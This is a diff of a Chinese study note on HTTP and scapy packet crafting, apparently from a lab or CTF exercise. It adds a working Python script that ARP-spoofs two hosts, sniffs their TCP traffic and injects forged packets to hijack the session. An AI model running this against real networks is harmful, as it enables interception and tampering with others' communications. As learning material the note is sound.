@@ -9,29 +9,29 @@ comments: true
 
 - [前言](#前言)
 - [1. http协议](#1-http协议)
-  - [1.1 RFC 1945(http/1.0)](#11-rfc-1945http10)
-  - [1.2 http1.0 请求/回复格式](#12-http10-请求回复格式)
-  - [1.3 http1.0 状态码](#13-http10-状态码)
-  - [1.4 Method](#14-method)
-  - [1.5 HTTP URL Scheme](#15-http-url-scheme)
-  - [1.6 url encoding](#16-url-encoding)
-  - [1.7 Content-Type](#17-content-type)
-  - [1.8 Cookie](#18-cookie)
-    - [1.8.1 Session ID](#181-session-id)
+	- [1.1 RFC 1945(http/1.0)](#11-rfc-1945http10)
+	- [1.2 http1.0 请求/回复格式](#12-http10-请求回复格式)
+	- [1.3 http1.0 状态码](#13-http10-状态码)
+	- [1.4 Method](#14-method)
+	- [1.5 HTTP URL Scheme](#15-http-url-scheme)
+	- [1.6 url encoding](#16-url-encoding)
+	- [1.7 Content-Type](#17-content-type)
+	- [1.8 Cookie](#18-cookie)
+		- [1.8.1 Session ID](#181-session-id)
 - [2. 常见的请求命令](#2-常见的请求命令)
-  - [2.1 get请求常见方法](#21-get请求常见方法)
-  - [2.2 post请求常见方法](#22-post请求常见方法)
-  - [2.3 redirect](#23-redirect)
-  - [2.4 cookie](#24-cookie)
+	- [2.1 get请求常见方法](#21-get请求常见方法)
+	- [2.2 post请求常见方法](#22-post请求常见方法)
+	- [2.3 redirect](#23-redirect)
+	- [2.4 cookie](#24-cookie)
 - [3. 扫描/监听报文命令](#3-扫描监听报文命令)
 - [4. scapy编写发送脚本](#4-scapy编写发送脚本)
-  - [4.1 发送以太网报文](#41-发送以太网报文)
-  - [4.2 发送IP报文](#42-发送ip报文)
-  - [4.3 发送TCP报文](#43-发送tcp报文)
-  - [4.4 TCP三次握手](#44-tcp三次握手)
-  - [4.5 发送ARP报文](#45-发送arp报文)
-  - [4.6 arp欺骗](#46-arp欺骗)
-  - [4.6 tcp中间人流量监听](#46-tcp中间人流量监听)
+	- [4.1 发送以太网报文](#41-发送以太网报文)
+	- [4.2 发送IP报文](#42-发送ip报文)
+	- [4.3 发送TCP报文](#43-发送tcp报文)
+	- [4.4 TCP三次握手](#44-tcp三次握手)
+	- [4.5 发送ARP报文](#45-发送arp报文)
+	- [4.6 arp欺骗](#46-arp欺骗)
+	- [4.6 tcp中间人流量监听](#46-tcp中间人流量监听)
 
 
 ## 前言<br>
@@ -532,6 +532,78 @@ def process_packet(packet):
 						copy.show2()
 						sendp(copy,iface="eth0") # 原本想要劫持，但是出了问题，但是发现通过send发送的报文无法被wireshark截获，然而sendp发送的被识别为不合法的报文，很怪
 			#send(packet,iface="eth0")
+arp_thread=threading.Thread(target=arp_spoof)
+arp_thread.start()
+
+sniff(prn=process_packet,iface="eth0")
+```
+sendp是可以发的，可以通过伪造发送`ACK和 PSH,ACK`报文来篡改消息（提早建链），然而还是没什么卵用，有一个问题是**原通信机在收不到报文后，会发送RST消息，导致链路中断**<br>
+截获tcp报文，抢先发送占据链路<br>
+```python
+from scapy.all import *
+import threading
+import time
+import sys
+conf.verb= 0
+ip1= "10.0.0.3"	
+ip2= "10.0.0.4"
+def arp_poison(target_ip,spoof_ip):
+	arp=ARP(op="is-at",psrc=spoof_ip,pdst=target_ip)
+	ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+	packet= ether/arp
+	# packet.show()
+	sendp(packet,iface="eth0")
+
+def arp_spoof():
+	while True:
+		# print("start poisioning...")
+		arp_poison(ip1,ip2)
+		arp_poison(ip2,ip1)
+		time.sleep(1)
+
+def process_packet(packet):
+	if IP in packet:
+		ip_src = packet[IP].src
+		ip_dst = packet[IP].dst
+		if ip_src== ip1 and ip_dst == ip2:
+			#print("{ip1} to {ip2}")
+			if packet.haslayer(Raw):
+				data = packet[Raw].load
+				print(data)
+				if b"COMMANDS" in data:
+					print("hit!!!------------------------")
+					packet[IP].src = ip2
+					packet[IP].dst = ip1
+					sport = packet[TCP].sport
+					dport = packet[TCP].dport
+					packet[TCP].sport = dport
+					packet[TCP].dport = sport
+					packet[TCP].flags= "A"
+					packet[Raw].load = None
+					del packet[IP].len
+					del packet[IP].chksum
+					del packet[IP].chksum
+					packet.show2()
+					sendp(packet,iface="eth0")
+					
+					packet[Raw].load = b"FLAG\n"
+					seq =packet[TCP].seq
+					ack = packet[TCP].ack
+					packet[TCP].seq = ack
+					packet[TCP].ack = seq+29
+					packet[TCP].flags = "PA"
+					del packet[IP].len
+					del packet[IP].chksum
+					del packet[TCP].chksum
+					packet.show2()
+					sendp(packet,iface="eth0")
+		else :
+			if ip_src == ip2 and ip_dst ==ip1:
+				#print("{ip2} to {ip1}")
+				if packet.haslayer(Raw):
+					copy = packet.copy()
+					data = copy[Raw].load
+					print(data)
 arp_thread=threading.Thread(target=arp_spoof)
 arp_thread.start()
 
